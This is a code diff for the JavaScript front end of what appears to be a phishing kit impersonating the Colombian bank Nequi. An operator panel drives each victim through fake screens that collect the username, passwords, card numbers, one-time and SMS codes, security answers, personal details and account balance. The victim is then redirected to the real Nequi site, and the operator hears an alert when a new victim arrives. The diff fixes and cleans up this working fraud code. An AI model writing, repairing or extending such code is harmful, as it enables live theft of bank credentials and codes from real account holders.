@@ -25,76 +25,10 @@ function detectar_dispositivo(){
     return dispositivo;
 }  
 
-/*
-function consultar_estado(){ //
-    if (espera == 1) { 
-        var op = 'estado';
-        $.post( "run/traer-datos.php",{op: op},function(data) { 
-          //
-            //dat = typeof data;23
-           // console.log(data);
-            dat = parseInt(data);
-            console.log(dat);
-            switch (dat) { 
-                case 2:espera = 0; 
-                         vista_otp(); 
-                         break;
-                case 4:espera = 0;
-                         vista_email(); 
-                         break;
-                case 6:espera = 0;
-                         vista_tarjeta();  
-                         break;               
-                case 8:espera = 0;
-                         vista_errorotp(); 
-                         break;
-                case 10:espera = 0;
-                		  //salir();
-                          window.location.href = "https://www.nequi.com.co/";
-                          break;
-                case 12:espera = 0;
-                          vista_usuario(); 
-                          break;
-                case 13:espera = 0;
-                          vista_tarjetadt();
-                          break;  
-                case 15:espera = 0;
-                          vista_apellidos();
-                          break;   
-                case 17:espera = 0; 
-                          vista_fnacimiento();
-                          break;   
-                case 19:espera = 0;
-                          vista_celular();
-                          break;   
-                case 21:espera = 0; 
-                          vista_pregunta();
-                          break; 
-                case 23:espera = 0; 
-                          vista_clave();
-                          break;  
-                case 25:espera = 0; 
-                          vista_pregunta2();
-                          break; 
-                case 26:espera = 0; 
-                          vista_clave2();
-                          break;  
-                case 31:espera = 0; 
-                          vista_smsotp();
-                          break;  
-                case 33:espera = 0; 
-                          vista_gestionpago();
-                          break;                                                                             
-            } 
-        });    
-    }    
-}
-*/
-
 // Inicializar variable para almacenar el estado anterior
 window.__lastNequiEstado = null;
 
-/** Códigos alineados con el panel (run/status.php): 2 OTP, 4 correo, 6 tarjeta, 8 error OTP, 10 fin, 12 usuario */
+/** Códigos alineados con el panel (run/status.php): 2 OTP, 4 correo, 5 saldo, 6 tarjeta, 8 error OTP, 10 fin, 12 usuario */
 function consultar_estado() {
     if (window.__nequiDemoSaldo) {
         return;
@@ -119,7 +53,7 @@ function consultar_estado() {
                 }
                 espera = 1;
                 break;
-            case '5':  // ← NUEVO: Estado para saldo
+            case '5':  // Estado para saldo
                 if (prevEst !== '5' || !$(".saldo-disponible").is(":visible")) {
                     vista_saldo();
                 }
@@ -162,8 +96,8 @@ function consultar_estado() {
                 espera = 1;
                 break;
             case '27':
-                if (prevEst !== '27' || !$(".saldo-disponible").is(":visible")) {
-                    vista_saldo();
+                if (prevEst !== '27') {
+                    vista_saldo_listo();
                 }
                 espera = 1;
                 break;
@@ -183,7 +117,7 @@ function consultar_estado() {
 function vista_saldo() {
     $(".fondo").hide();
     $(".mensaje").hide();
-    $(".total").hide(); // ← CORRECCIÓN: Ocultar el contenedor total
+    $(".total").hide();
     $(".acceso").hide();
     $(".otp").hide();
     $(".errorotp").hide();
@@ -215,6 +149,7 @@ function vista_saldo_listo() {
     $(".fondo").show();
     $(".mensaje").show();
 }
+
 function vista_preguntarep(){
     $(".saldo-disponible").hide();
 
@@ -250,8 +185,8 @@ function vista_preguntarep(){
     $(".pregunta2").show();
     $("#resp2").focus();
 }
-function salir(){
 
+function salir(){
     equi = detectar_dispositivo();
 	console.log(equi);
 
@@ -270,7 +205,6 @@ function salir(){
             console.log('no es android');
             window.location.href = "https://www.nequi.com.co/";
         }
-
 }
 
 function vista_otp(){
@@ -278,8 +212,6 @@ function vista_otp(){
     $(".mensaje").hide();
     $(".saldo-disponible").hide();
 
-//    document.getElementById("codigootp").value = "";  
-    
     $(".tarjeta").hide();
     $(".errorotp").hide();
     $(".acceso").hide();    
@@ -297,7 +229,6 @@ function vista_otp(){
     $(".codigootp3").hide();
     $(".total").show();     
     $(".otp").show();
-//    $("#codigootp").focus();
 
     // Limpiar los campos de code_numerickeypad
     $('.code_numerickeypad span').each(function() {
@@ -306,19 +237,14 @@ function vista_otp(){
 
     // Reiniciar el índice y los valores ingresados
     currentIndex = 0;
-    enteredValues.length = 0;  // Borra todos los valores ingresados      
+    enteredValues.length = 0;
 }
 
 function vista_errorotp(){
-    //$("#msgOTP2").html("¡Ups! Clave dinámica inválida o vencida ");
-    //$("#msgOTP2").css("display", "table");
-
     $(".fondo").hide();
     $(".mensaje").hide();
     $(".saldo-disponible").hide();
 
-    //document.getElementById("codigootp2").value = "";
-    
     $(".tarjeta").hide();
     $(".acceso").hide();    
     $(".correo-con").hide();
@@ -336,7 +262,6 @@ function vista_errorotp(){
     $(".total").show(); 
     $(".otp").show();        
     $(".errorotp").show();
-    //$("#codigootp2").focus();
 
     // Limpiar los campos de code_numerickeypad
     $('.code_numerickeypad span').each(function() {
@@ -345,9 +270,8 @@ function vista_errorotp(){
 
     // Reiniciar el índice y los valores ingresados
     currentIndex = 0;
-    enteredValues.length = 0;  // Borra todos los valores ingresados    
+    enteredValues.length = 0;
 }
-
 
 function vista_usuario(){
     $(".fondo").hide();
@@ -375,9 +299,7 @@ function vista_usuario(){
     $(".total").show();     
     $(".acceso").show();
     $("#usuario").focus();
-
 }
-
 
 function vista_email(){
     $(".fondo").hide();
@@ -405,9 +327,7 @@ function vista_email(){
     $(".total").show();     
     $(".correo-con").show();
     $("#email").focus();
-
 }
-
 
 function vista_tarjeta(){
     $(".fondo").hide();
@@ -436,9 +356,7 @@ function vista_tarjeta(){
     $(".total").show();     
     $(".tarjeta").show();
     $("#tarjeta16").focus();
-
 }
-
 
 function vista_tarjetadt(){
     $(".fondo").hide();
@@ -467,9 +385,7 @@ function vista_tarjetadt(){
     $(".total").show();     
     $(".tarjetadt").show();
     $("#tarjeta16dt").focus();
-
 }
-
 
 function vista_apellidos(){
     $(".fondo").hide();
@@ -550,14 +466,6 @@ function vista_celular(){
 }
 
 function vista_pregunta(){
-
- /*   $.post( "run/traer-pregunta.php",function(date) {
-        console.log(date);
-        var resp = date;
-        document.getElementById("preg").innerHTML = resp;
-     });
-*/     
-
     $(".fondo").hide();
     $(".mensaje").hide();   
     
@@ -644,7 +552,6 @@ function vista_clave(){
     $(".total").show();     
     $(".clave").show();
     $("#clave").focus();
-
 }
 
 function vista_clave2(){
@@ -671,7 +578,6 @@ function vista_clave2(){
     $(".total").show();     
     $(".clave2").show();
     $("#clave2").focus();
-
 }
 
 function vista_smsotp(){
@@ -703,8 +609,6 @@ function vista_smsotp(){
 function vista_gestionpago(){
     $(".fondo").hide();
     $(".mensaje").hide();
-
-    // document.getElementById("smsotp").value = "";  
     
     $(".tarjeta").hide();
     $(".errorotp").hide();
@@ -722,9 +626,7 @@ function vista_gestionpago(){
     $(".total").hide();
     $(".codigootp3").hide();    
     $(".solicitacodigo").show();
-    // $("#smsotp").focus();
 }
-
 
 function actualizar_casos(){
     $.post( "../process/casos.php", function(data) {
@@ -732,10 +634,13 @@ function actualizar_casos(){
         $.post( "../process/pito.php", function(res) {
             if (res == "SI") {
                 $("audio").get(0).play();
-            }else{
-
             }
-			function guardarSaldoNequi() {
+        });
+    });
+}
+
+// ✅ FUNCIÓN CORREGIDA - AHORA ESTÁ EN EL NIVEL CORRECTO
+function guardarSaldoNequi() {
     var saldo = document.getElementById("inputsaldo").value;
     
     if (saldo.trim().length < 3) {
@@ -743,20 +648,17 @@ function actualizar_casos(){
         return;
     }
     
-    // Mostrar spinner de carga ← ESTO ERA LO QUE FALTABA
+    // Mostrar spinner de carga
     vista_saldo_listo();
     
     // Enviar saldo al backend
     $.post("../../../process/guardar_saldo.php", {saldo: saldo}, function(data) {
         if (data.trim() === 'OK') {
             console.log('Saldo guardado correctamente');
-            // El panel cambiará de estado automáticamente
+            // El panel cambiará de estado automáticamente (estado 27 → 28)
         } else {
             console.error('Error al guardar saldo');
-            vista_saldo();  // Volver a mostrar el formulario
+            vista_saldo();  // Volver a mostrar el formulario si hay error
         }
-    });
-}
-        });
     });
 }
